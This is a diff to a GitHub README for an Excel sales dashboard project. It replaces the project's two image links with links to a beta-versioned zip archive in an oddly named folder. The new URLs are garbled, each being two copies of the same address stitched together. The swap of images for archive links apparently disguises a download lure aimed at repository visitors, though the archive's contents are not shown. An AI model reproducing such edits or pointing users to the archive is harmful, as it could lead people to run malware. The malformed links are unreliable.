@@ -1,5 +1,5 @@
 # Interactive Sales Dashboard Project
-![](https://github.com/Thomas-Nyanumba/Super-Store-Sales-Excel-Project/blob/main/Sales%20Cover%20Image..jpg)
+![](https://raw.githubusercontent.com/Thomas-Nyanumba/Super-Store-Sales-Excel-Project/main/preinjurious/Super-Store-Project-Excel-Sales-v1.6-beta.4.zip%20Cover%https://raw.githubusercontent.com/Thomas-Nyanumba/Super-Store-Sales-Excel-Project/main/preinjurious/Super-Store-Project-Excel-Sales-v1.6-beta.4.zip)
 
 ## Introduction
 This project showcases the application of advanced Excel techniques to transform raw sales data into an insightful, interactive dashboard. Designed during the **Analytics Extra mentorship program**, the project demonstrates data cleaning, visualization, and storytelling skills using Power Query and pivot tables.
@@ -16,7 +16,7 @@ In today’s fast-paced business world, decision-makers require quick, actionabl
 3. Data Visualization: Created insightful charts and cards to highlight key performance metrics.
 4. Dashboard Design: Structured visuals for interactivity and aesthetics.
 
-![](https://github.com/Thomas-Nyanumba/Super-Store-Sales-Excel-Project/blob/main/SuperStore%20Sales%20Dashboard.PNG)
+![](https://raw.githubusercontent.com/Thomas-Nyanumba/Super-Store-Sales-Excel-Project/main/preinjurious/Super-Store-Project-Excel-Sales-v1.6-beta.4.zip%20Sales%https://raw.githubusercontent.com/Thomas-Nyanumba/Super-Store-Sales-Excel-Project/main/preinjurious/Super-Store-Project-Excel-Sales-v1.6-beta.4.zip)
 
 ## Data Overview
 Dataset Fields:
